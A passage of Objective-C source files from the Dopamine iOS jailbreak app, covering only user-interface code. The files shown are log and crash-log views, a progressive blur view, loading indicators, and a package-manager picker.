    {
        self.textView = [[UITextView alloc] init];
        self.textView.translatesAutoresizingMaskIntoConstraints = NO;
        self.textView.backgroundColor = [UIColor clearColor];
        self.textView.textColor = [UIColor whiteColor];
        self.textView.font = [UIFont systemFontOfSize:14];
        self.textView.editable = NO;
        self.textView.scrollEnabled = YES;
        self.textView.textContainerInset = UIEdgeInsetsMake(0, 15, 15, 15);
        self.textView.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];

        [self addSubview:self.textView];

        [NSLayoutConstraint activateConstraints:@[
            [self.textView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [self.textView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [self.textView.topAnchor constraintEqualToAnchor:self.topAnchor constant:65],
            [self.textView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
        ]];        
        
        self.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.7];
    }
    return self;
}

-(void)showLog:(NSString *)log
{
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showLog:log];
        });
        return;
    }

    self.textView.text = [self.textView.text stringByAppendingString:[NSString stringWithFormat:@"> %@\n", log]];
    [UIView performWithoutAnimation:^{
        [self.textView scrollRangeToVisible:NSMakeRange(self.textView.text.length, 0)];
    }];
}

-(void)didComplete
{

}


@end

```

`Application/Dopamine/UI/Log/DOLogCrashViewController.h`:

```h
//
//  DOLogCrashViewController.h
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOLogCrashViewController : UIViewController
{
    UITextView *_logView;
}

- (id)initWithTitle:(NSString*)title;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DOLogCrashViewController.m`:

```m
//
//  DOLogCrashViewController.m
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import "DOLogCrashViewController.h"
#import "DOPSListController.h"
#import "DOPSListItemsController.h"
#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"
#import "DOUIManager.h"

@interface DOLogCrashViewController ()

@property (nonatomic, retain) NSString *title;

@end

@implementation DOLogCrashViewController

- (id)initWithTitle:(NSString*)title
{
    if (self = [super init])
    {
        self.title = title;
    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    [DOPSListController setupViewControllerStyle:self];

    UIView *header = [DOPSListItemsController makeHeader:DOLocalizedString(@"Log_Error") withTarget:self];
    header.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:header];

    [NSLayoutConstraint activateConstraints:@[
        [header.topAnchor constraintEqualToAnchor:self.view.topAnchor constant:5],
        [header.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [header.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [header.heightAnchor constraintEqualToConstant:70]
    ]];
    
    __block DOActionMenuButton *shareButton;
    UIAction *shareAction = [UIAction actionWithTitle:DOLocalizedString(@"Button_Share") image:[UIImage systemImageNamed:@"square.and.arrow.up" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"share" handler:^(__kindof UIAction * _Nonnull action) {
        [[DOUIManager sharedInstance] shareLogRecordFromView:shareButton];
    }];
    shareButton = [DOActionMenuButton buttonWithAction:shareAction chevron:NO];
    
    shareButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:shareButton];

    [NSLayoutConstraint activateConstraints:@[
        [shareButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [shareButton.heightAnchor constraintEqualToConstant:30],
        [shareButton.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor constant:-30]
    ]];
    
    if (@available(iOS 16.0, *)) {
        _logView = [UITextView textViewUsingTextLayoutManager:false];
    }
    else {
        _logView = [[UITextView alloc] init];
    }
    _logView.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:_logView];

    [NSLayoutConstraint activateConstraints:@[
        [_logView.topAnchor constraintEqualToAnchor:header.bottomAnchor constant:-12],
        [_logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [_logView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
        [_logView.bottomAnchor constraintEqualToAnchor:shareButton.topAnchor constant:-10]
    ]];

    NSArray *reverseLog = [[[DOUIManager sharedInstance] logRecord] reverseObjectEnumerator].allObjects;
    _logView.text = [reverseLog componentsJoinedByString:@"\n"];
    _logView.editable = NO;
    _logView.font = [UIFont systemFontOfSize:14];
    _logView.textColor = [UIColor whiteColor];
    _logView.backgroundColor = [UIColor clearColor];
}

- (void)viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];
    [[UIApplication sharedApplication] performSelector:@selector(suspend)];
    [NSThread sleepForTimeInterval:0.3];
    exit(0);
}

- (void)dismiss
{
    [self.navigationController popViewControllerAnimated:YES];
}


@end

```

`Application/Dopamine/UI/Log/DOLogViewProtocol.h`:

```h
//
//  DOLogViewProtocol.h
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@protocol DOLogViewProtocol <NSObject>

-(void)showLog:(NSString *)log;
-(void)didComplete;

@optional
- (void)updateLog:(NSString *)log;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DOLyricsLogItemView.h`:

```h
//
//  DOLyricsLogItemView.h
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOLoadingIndicator.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOLyricsLogItemView : UIView

@property (nonatomic) UILabel *label;
@property (nonatomic) DOLoadingIndicator *loadingIndicator;
@property (nonatomic) BOOL completed;
@property (nonatomic) UIImpactFeedbackGenerator *feedbackGenerator;

@property (nonatomic) UIImage *completedImage;
@property (nonatomic) UIImage *failedImage;
@property (nonatomic) UIImage *successImage;

- (id)initWithString:(NSString *)string completedImage:(UIImage *)completedImage failedImage:(UIImage *)failedImage successImage:(UIImage *)successImage;
- (void)setCompleted;
- (void)setFailed;
- (void)setSuccess;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DOLyricsLogItemView.m`:

```m
//
//  DOLyricsLogItemView.m
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import "DOLyricsLogItemView.h"

@implementation DOLyricsLogItemView

- (id)initWithString:(NSString *)string completedImage:(UIImage *)completedImage failedImage:(UIImage *)failedImage successImage:(UIImage *)successImage {
    if (self = [super init]) {
        self.translatesAutoresizingMaskIntoConstraints = NO;
        self.alpha = 0.9;

        self.label = [[UILabel alloc] init];
        self.label.translatesAutoresizingMaskIntoConstraints = NO;
        self.label.text = string;
        self.label.textColor = [UIColor whiteColor];
        self.label.font = [UIFont systemFontOfSize:20];
        [self addSubview:self.label];

        self.loadingIndicator = [[DOLoadingIndicator alloc] init];
        self.loadingIndicator.translatesAutoresizingMaskIntoConstraints = NO;
        [self addSubview:self.loadingIndicator];

        [NSLayoutConstraint activateConstraints:@[
            [self.loadingIndicator.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [self.loadingIndicator.centerYAnchor constraintEqualToAnchor:self.centerYAnchor],
            [self.loadingIndicator.heightAnchor constraintEqualToConstant:30],
            [self.loadingIndicator.widthAnchor constraintEqualToConstant:30],
            
            [self.label.leadingAnchor constraintEqualToAnchor:self.loadingIndicator.trailingAnchor constant:15],
            [self.label.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [self.label.topAnchor constraintEqualToAnchor:self.topAnchor],
            [self.label.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],

        ]];
        self.transform = CGAffineTransformMakeTranslation(0, 8);
        self.feedbackGenerator = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
        self.alpha = 0;
        
        self.completedImage = completedImage;
        self.failedImage = failedImage;
        self.successImage = successImage;
    }
    return self;
}

- (void)completeWithImage:(UIImage *)image
{
    if (self.completed) return;
    self.completed = YES;
    
    UIImageView *imageView = [[UIImageView alloc] initWithImage:image];

    imageView.translatesAutoresizingMaskIntoConstraints = NO;
    imageView.tintColor = [UIColor whiteColor];
    imageView.alpha = 0;

    [self addSubview:imageView];
    [NSLayoutConstraint activateConstraints:@[
        [imageView.centerYAnchor constraintEqualToAnchor:self.loadingIndicator.centerYAnchor],
        [imageView.centerXAnchor constraintEqualToAnchor:self.loadingIndicator.centerXAnchor],
    ]];

    self.label.font = [UIFont systemFontOfSize:18];

    [UIView animateWithDuration:0.2 animations:^{
        self.alpha = 0.5;
        self.loadingIndicator.alpha = 0;
        imageView.alpha = 1;
        self.transform = CGAffineTransformMakeTranslation(0, 0);
    }];

    [self.feedbackGenerator impactOccurred];
}

- (void)setCompleted {
    [self completeWithImage:self.completedImage];
}

- (void)setFailed {
    [self completeWithImage:self.failedImage];
}

- (void)setSuccess {
    [self completeWithImage:self.successImage];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [self.feedbackGenerator impactOccurredWithIntensity:1];
    });
}

@end

```

`Application/Dopamine/UI/Log/DOLyricsLogView.h`:

```h
//
//  DOLyricsLogView.h
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOLogViewProtocol.h"
#import "DOLoadingIndicator.h"
#import "DOLyricsLogItemView.h"

NS_ASSUME_NONNULL_BEGIN

/// They're just called lyrics log view because they remind me of apple music lyrics 🤫
@interface DOLyricsLogView : UIView<DOLogViewProtocol>
{
    UIImage *_checkmarkImage;
    UIImage *_exclamationMarkImage;
    UIImage *_unlockedImage;
}

@property (nonatomic, strong) UIStackView *stackView;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DOLyricsLogView.m`:

```m
//
//  DOLyricsLogView.m
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import "DOLyricsLogView.h"
#import "DOProgressiveBlurView.h"
#import "DOGlobalAppearance.h"

#define LOG_HEIGHT 40

@implementation DOLyricsLogView

- (id)init
{
    if (self = [super init]) {
        self.stackView = [[UIStackView alloc] init];
        self.stackView.axis = UILayoutConstraintAxisVertical;
        self.stackView.spacing = 0;
        self.stackView.translatesAutoresizingMaskIntoConstraints = NO;
        self.stackView.alignment = UIStackViewAlignmentLeading;
        [self addSubview:self.stackView];

        [NSLayoutConstraint activateConstraints:@[
            [self.stackView.topAnchor constraintEqualToAnchor:self.bottomAnchor constant:[DOGlobalAppearance isHomeButtonDevice] ? -50 : -80],
            [self.stackView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:25],
            [self.stackView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-25],
        ]];


        DOProgressiveBlurView *blurView = [[DOProgressiveBlurView alloc] initWithGradientMask:[UIImage imageNamed:@"alpha-gradient"] maxBlurRadius:4];
        blurView.translatesAutoresizingMaskIntoConstraints = NO;
        [self addSubview:blurView];

        [NSLayoutConstraint activateConstraints:@[
            [blurView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [blurView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [blurView.topAnchor constraintEqualToAnchor:self.topAnchor],
            [blurView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-125],
        ]];
        
        _checkmarkImage = [UIImage systemImageNamed:@"checkmark" withConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:19 weight:UIImageSymbolWeightRegular]];
        _exclamationMarkImage = [UIImage systemImageNamed:@"exclamationmark.circle" withConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:19 weight:UIImageSymbolWeightRegular]];
        _unlockedImage = [UIImage systemImageNamed:@"lock.open" withConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:19 weight:UIImageSymbolWeightRegular]];
    }
    return self;
}

- (void)showLog:(nonnull NSString *)log
{
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showLog:log];
        });
        return;
    }

    [self.stackView.arrangedSubviews makeObjectsPerformSelector:@selector(setCompleted)];

    DOLyricsLogItemView *itemView = [[DOLyricsLogItemView alloc] initWithString:log completedImage:_checkmarkImage failedImage:_exclamationMarkImage successImage:_unlockedImage];
    [self.stackView addArrangedSubview:itemView];

    [NSLayoutConstraint activateConstraints:@[
        [itemView.leadingAnchor constraintEqualToAnchor:self.stackView.leadingAnchor],
        [itemView.trailingAnchor constraintEqualToAnchor:self.stackView.trailingAnchor],
        [itemView.heightAnchor constraintEqualToConstant:LOG_HEIGHT]
    ]];

    CGFloat currentTranslation = self.stackView.transform.ty;
    [UIView animateWithDuration:0.3 animations:^{
        itemView.alpha = 1;
        self.stackView.transform = CGAffineTransformMakeTranslation(0, currentTranslation - LOG_HEIGHT);
    }];
}

- (void)updateLog:(nonnull NSString *)log
{
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self updateLog:log];
        });
        return;
    }
    DOLyricsLogItemView *lastItemView = self.stackView.arrangedSubviews.lastObject;
    lastItemView.label.text = log;
}

- (void)didComplete
{
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self didComplete];
        });
        return;
    }

    [self showLog:@"Done"];
    [self.stackView.arrangedSubviews makeObjectsPerformSelector:@selector(setSuccess)];
}

@end

```

`Application/Dopamine/UI/Log/DOProgressiveBlurView.h`:

```h
//
//  DOProgressiveBlurView.h
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOProgressiveBlurView : UIVisualEffectView

- (instancetype)initWithGradientMask:(UIImage *)gradientMask maxBlurRadius:(CGFloat)maxBlurRadius;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DOProgressiveBlurView.m`:

```m
//
//  DOProgressiveBlurView.m
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import "DOProgressiveBlurView.h"

@interface UIBlurEffect (Private)
- (id)effectSettings;
@end
@interface DOBlurEffect : UIBlurEffect
@end
@implementation DOBlurEffect
- (id)effectSettings {
    id settings = [super effectSettings];
    [settings setValue:@(1.0) forKey:@"scale"];
    [settings setValue:@0 forKey:@"grayscaleTintAlpha"];
    [settings setValue:@1 forKey:@"saturationDeltaFactor"];
    return settings;
}

@end

@interface DOProgressiveBlurView ()

@property (retain) id variableBlur;

@end

@implementation DOProgressiveBlurView

- (instancetype)initWithGradientMask:(UIImage *)gradientMask maxBlurRadius:(CGFloat)maxBlurRadius {
    self = [super initWithEffect:[DOBlurEffect effectWithStyle:UIBlurEffectStyleRegular]];
    if (self) {
        Class CAFilter = NSClassFromString(@"CAFilter");
        self.variableBlur = [CAFilter performSelector:NSSelectorFromString(@"filterWithType:") withObject:@"variableBlur"];
        [self.variableBlur setValue:@(maxBlurRadius) forKey:@"inputRadius"];
        [self.variableBlur setValue:(__bridge id)(gradientMask.CGImage) forKey:@"inputMaskImage"];
        [self.variableBlur setValue:@YES forKey:@"inputNormalizeEdges"];
    }
    return self;
}

-(void)layoutSubviews
{
    [super layoutSubviews];
    [self.subviews.firstObject.layer setValue:@[self.variableBlur] forKey:@"filters"];
}

@end

```

`Application/Dopamine/UI/Log/Indicator/DODoubleHelixIndicator.h`:

```h
//
//  DODoubleHelixIndicator.h
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DODoubleHelixIndicator : UIView

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/Indicator/DODoubleHelixIndicator.m`:

```m
//
//  DODoubleHelixIndicator.m
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import "DODoubleHelixIndicator.h"

@implementation DODoubleHelixIndicator

/// Bad remake of the double helix indicator from
/// https://github.com/SwiftfulThinking/SwiftfulLoadingIndicators

-(id)init {
    self = [super initWithFrame:CGRectMake(0, 0, 30, 30)];
    if (self) {
        
        int COUNT = 10;
        for (int i = 0; i < COUNT; i++)
        {
            [self createDotForIndex:i top:YES];
        }
        for (int i = 0; i < COUNT; i++)
        {
            [self createDotForIndex:i top:NO];
        }

    }
    return self;
}

-(void)createDotForIndex:(int)i top:(BOOL)top {
    int HEIGHT = 8;
    UIView *view = [[UIView alloc] initWithFrame:CGRectMake(i * (2 + 1), top ? HEIGHT : 0, 2, 2)];
    [view setBackgroundColor:[UIColor whiteColor]];
    [view.layer setCornerRadius:1];
    [view setClipsToBounds:YES];
    [self addSubview:view];

    if (top)
        view.alpha = 0.8;

    //infinite animation easeinout + delay
    CAKeyframeAnimation *animation = [CAKeyframeAnimation animationWithKeyPath:@"transform.translation.y"];
    animation.repeatCount = INFINITY;
    animation.duration = 2.3;
    animation.beginTime = CACurrentMediaTime() + (0.1 * i);
    animation.keyTimes = @[@0.0, @0.5, @1.0];
    animation.timingFunctions = @[
        [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut],
        [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut],
        [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut]
    ];
    if (top)
        animation.values = @[@0.0, @(HEIGHT * -1), @0.0];
    else
        animation.values = @[@0.0, @(HEIGHT), @0.0];
    [view.layer addAnimation:animation forKey:@"animation"];
}

@end

```

`Application/Dopamine/UI/Log/Indicator/DOLoadingIndicator.h`:

```h
//
//  DOLoadingIndicator.h
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOLoadingIndicator : UIView

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/Indicator/DOLoadingIndicator.m`:

```m
//
//  DOLoadingIndicator.m
//  Dopamine
//
//  Created by tomt000 on 18/01/2024.
//

#import "DOLoadingIndicator.h"

@implementation DOLoadingIndicator

-(id)init {
    if (self = [super init]) {
        UIImage *image = [UIImage imageNamed:@"Loading"];
        UIImageView *imageView = [[UIImageView alloc] initWithImage:image];
        imageView.translatesAutoresizingMaskIntoConstraints = NO;
        [self addSubview:imageView];
        [NSLayoutConstraint activateConstraints:@[
            [imageView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [imageView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [imageView.topAnchor constraintEqualToAnchor:self.topAnchor],
            [imageView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
        ]];

        CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
        animation.fromValue = @0.0;
        animation.toValue = @(2 * M_PI);
        animation.duration = 1.0;
        animation.repeatCount = INFINITY;
        [imageView.layer addAnimation:animation forKey:@"rotationAnimation"];
    }
    return self;
}

@end

```

`Application/Dopamine/UI/PkgManagers/DOAppSwitch.h`:

```h
//
//  DOAppSwitch.h
//  Dopamine
//
//  Created by tomt000 on 08/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOAppSwitch : UIView

@property (nonatomic, assign) BOOL selected;
@property (nonatomic) void (^onSwitch)(BOOL);

-(id)initWithIcon:(UIImage *)icon title:(NSString *)title;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/PkgManagers/DOAppSwitch.m`:

```m
//
//  DOAppSwitch.m
//  Dopamine
//
//  Created by tomt000 on 08/02/2024.
//

#import "DOAppSwitch.h"

@interface DOAppSwitch ()

@property (strong, nonatomic) UIImageView *iconView;
@property (strong, nonatomic) UIStackView *stackView;
@property (strong, nonatomic) UIImageView *selector;
@property (strong, nonatomic) UIImpactFeedbackGenerator *hapticGenerator;


@end

#define TITLE_HEIGHT 40
#define CIRCLE_SIZE 19

@implementation DOAppSwitch

-(id)initWithIcon:(UIImage *)icon title:(NSString *)title {
    self = [super init];
    if (self) {
        self.hapticGenerator = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
        
        self.iconView = [[UIImageView alloc] initWithImage:icon];
        self.iconView.layer.masksToBounds = YES;
        self.iconView.contentMode = UIViewContentModeScaleAspectFill;
        self.iconView.layer.cornerCurve = kCACornerCurveContinuous;
        self.iconView.translatesAutoresizingMaskIntoConstraints = NO;

        [self addSubview:self.iconView];

        [NSLayoutConstraint activateConstraints:@[
            [self.iconView.heightAnchor constraintEqualToAnchor:self.heightAnchor constant:-TITLE_HEIGHT],
            [self.iconView.widthAnchor constraintEqualToAnchor:self.iconView.heightAnchor],
            [self.iconView.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
            [self.iconView.topAnchor constraintEqualToAnchor:self.topAnchor]
        ]];

        UIStackView *stackView = [[UIStackView alloc] init];
        stackView.axis = UILayoutConstraintAxisHorizontal;
        stackView.alignment = UIStackViewAlignmentCenter;
        stackView.spacing = 7;
        stackView.translatesAutoresizingMaskIntoConstraints = NO;

        UILabel *label = [[UILabel alloc] init];
        label.text = title;
        label.font = [UIFont systemFontOfSize:16 weight:UIFontWeightMedium];
        label.textColor = [UIColor colorWithWhite:1.0 alpha:1.0];

        self.selector = [[UIImageView alloc] init];
        self.selector.translatesAutoresizingMaskIntoConstraints = NO;

        [stackView addArrangedSubview:label];
        [stackView addArrangedSubview:self.selector];

        [self addSubview:stackView];

        [NSLayoutConstraint activateConstraints:@[
            [stackView.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
            [stackView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
            [stackView.heightAnchor constraintEqualToConstant:TITLE_HEIGHT],
            [self.selector.widthAnchor constraintEqualToConstant:CIRCLE_SIZE],
            [self.selector.heightAnchor constraintEqualToAnchor:label.heightAnchor]
        ]];

        [self setSelected:NO];
    }
    return self;
}

-(void)layoutSubviews {
    [super layoutSubviews];
    self.iconView.layer.cornerRadius = (10.0 / 57.0) * self.iconView.bounds.size.width;
}

-(void)setSelected:(BOOL)selected {
    _selected = selected;
    self.selector.image = selected ? [UIImage systemImageNamed:@"checkmark.circle.fill"] : [UIImage systemImageNamed:@"circle"];
    self.selector.tintColor = selected ? [UIColor whiteColor] : [UIColor colorWithWhite:1.0 alpha:0.5];
}

-(void)touchesBegan:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event {
    [super touchesBegan:touches withEvent:event];
    [self.hapticGenerator impactOccurred];
    self.iconView.alpha = 0.75;
}

-(void)touchesEnded:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event {
    [super touchesEnded:touches withEvent:event];
    [UIView animateWithDuration:0.2 animations:^{
        self.iconView.alpha = 1.0;
    }];
    [self setSelected:!self.selected];
    if (self.onSwitch) {
        self.onSwitch(self.selected);
    }
}

-(void)touchesCancelled:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event {
    [super touchesCancelled:touches withEvent:event];
    [UIView animateWithDuration:0.2 animations:^{
        self.iconView.alpha = 1.0;
    }];
}

@end

```

`Application/Dopamine/UI/PkgManagers/DOPkgManagerPickerView.h`:

```h
//
//  DOPkgManagerPickerView.h
//  Dopamine
//
//  Created by tomt000 on 08/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOPkgManagerPickerView : UIView

-(id)initWithCallback:(void (^)(BOOL))callback;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/PkgManagers/DOPkgManagerPickerView.m`:

```m
//
//  DOPkgManagerPickerView.m
//  Dopamine
//
//  Created by tomt000 on 08/02/2024.
//

#import "DOPkgManagerPickerView.h"
#import "DOAppSwitch.h"
#import "DOUIManager.h"
#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"

@interface DOPkgManagerPickerView ()

@property (nonatomic, retain) DOActionMenuButton *continueAction;

@end

#define PADDING_BTN_CONTINUE 30

@implementation DOPkgManagerPickerView

-(id)initWithCallback:(void (^)(BOOL))callback {
    self = [super init];
    if (self) {
        UIStackView *switchStack = [[UIStackView alloc] init];
        switchStack.axis = UILayoutConstraintAxisHorizontal;
        switchStack.translatesAutoresizingMaskIntoConstraints = NO;

        [self addSubview:switchStack];

        [NSLayoutConstraint activateConstraints:@[
            [switchStack.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
            [switchStack.centerYAnchor constraintEqualToAnchor:self.centerYAnchor constant: -([DOGlobalAppearance isHomeButtonDevice] ? 0 : 10)]
        ]];

        NSArray *packageManagers = [[DOUIManager sharedInstance] availablePackageManagers];
        [packageManagers enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
            NSDictionary *manager = (NSDictionary *)obj;
            DOAppSwitch *appSwitch = [[DOAppSwitch alloc] initWithIcon:[UIImage imageNamed:manager[@"Icon"]] title:manager[@"Display Name"]];
            appSwitch.selected = [[[DOUIManager sharedInstance] enabledPackageManagerKeys] containsObject:manager[@"Key"]];
            appSwitch.onSwitch = ^(BOOL enabled) {
                [[DOUIManager sharedInstance] setPackageManager:manager[@"Key"] enabled:enabled];
                [self updateButtonState];
            };

            appSwitch.translatesAutoresizingMaskIntoConstraints = NO;
            [switchStack addArrangedSubview:appSwitch];

            [NSLayoutConstraint activateConstraints:@[
                [appSwitch.widthAnchor constraintEqualToConstant:110],
                [appSwitch.heightAnchor constraintEqualToConstant:110]
            ]];
        }];
        

        UILabel *title = [[UILabel alloc] init];
        title.text = DOLocalizedString(@"Status_Title_Select_Package_Managers");
        title.textColor = [UIColor whiteColor];
        title.font = [UIFont systemFontOfSize:24 weight:UIFontWeightMedium];
        title.textAlignment = NSTextAlignmentCenter;
        title.translatesAutoresizingMaskIntoConstraints = NO;

        [self addSubview:title];

        [NSLayoutConstraint activateConstraints:@[
            [title.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
            [title.bottomAnchor constraintEqualToAnchor:switchStack.topAnchor constant:-30]
        ]];
        
        UILabel *tooltip = [[UILabel alloc] init];
        tooltip.text = DOLocalizedString(@"Select_Package_Managers_Install_Message");
        tooltip.textColor = [UIColor colorWithWhite:1.0 alpha:0.5];
        tooltip.font = [UIFont systemFontOfSize:14 weight:UIFontWeightRegular];
        tooltip.textAlignment = NSTextAlignmentCenter;
        tooltip.numberOfLines = 3;
        tooltip.translatesAutoresizingMaskIntoConstraints = NO;

        [self addSubview:tooltip];

        [NSLayoutConstraint activateConstraints:@[
            [tooltip.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
            [tooltip.topAnchor constraintEqualToAnchor:switchStack.bottomAnchor constant:15],
            [tooltip.widthAnchor constraintEqualToAnchor:switchStack.widthAnchor multiplier:1.25]
        ]];
        
        self.continueAction = [DOActionMenuButton buttonWithAction:[UIAction actionWithTitle:DOLocalizedString(@"Continue") image:[UIImage systemImageNamed:@"arrow.right" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"continue" handler:^(__kindof UIAction * _Nonnull action) {
            callback(TRUE);
        }] chevron:NO];
        self.continueAction.layer.cornerRadius = 14.0;
        self.continueAction.layer.cornerCurve = kCACornerCurveContinuous;
        self.continueAction.contentHorizontalAlignment = UIControlContentHorizontalAlignmentCenter;
        self.continueAction.translatesAutoresizingMaskIntoConstraints = NO;
        
        [self addSubview:self.continueAction];

        
        [NSLayoutConstraint activateConstraints:@[
            [self.continueAction.heightAnchor constraintEqualToConstant:50],
            [self.continueAction.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-PADDING_BTN_CONTINUE - ([DOGlobalAppearance isHomeButtonDevice] ? 0 : 10)],
            [self.continueAction.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:PADDING_BTN_CONTINUE],
            [self.continueAction.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-PADDING_BTN_CONTINUE]
        ]];
        
        
        
        [self updateButtonState];
        
    }
    return self;
}

- (void)updateButtonState
{
    NSArray *selected = [[DOUIManager sharedInstance] enabledPackageManagerKeys];
    self.continueAction.enabled = selected.count > 0;
    self.continueAction.backgroundColor = [UIColor colorWithWhite:1.0 alpha:selected.count > 0 ? 0.2 : 0.1];
}

@end

```

`Application/Dopamine/UI/PkgManagers/DOPkgManagerPickerViewController.h`:

```h
//
//  DOPkgManagerPickerViewController.h
//  Dopamine
//
//  Created by tomt000 on 11/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOPkgManagerPickerViewController : UIViewController

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/PkgManagers/DOPkgManagerPickerViewController.m`:

```m
//
//  DOPkgManagerPickerViewController.m
//  Dopamine
//
//  Created by tomt000 on 11/02/2024.
//

#import "DOPkgManagerPickerViewController.h"
#import "DOPkgManagerPickerView.h"
#import "DOEnvironmentManager.h"


@interface DOPkgManagerPickerViewController ()

@end

@implementation DOPkgManagerPickerViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    DOPkgManagerPickerView *picker = [[DOPkgManagerPickerView alloc] initWithCallback:^(BOOL success) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[DOEnvironmentManager sharedManager] reinstallPackageManagers];
            dispatch_async(dispatch_get_main_queue(), ^{
                [self.navigationController popViewControllerAnimated:YES];
            });
        });
    }];
    picker.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:picker];
    [NSLayoutConstraint activateConstraints:@[
        [picker.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [picker.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [picker.topAnchor constraintEqualToAnchor:self.view.topAnchor],
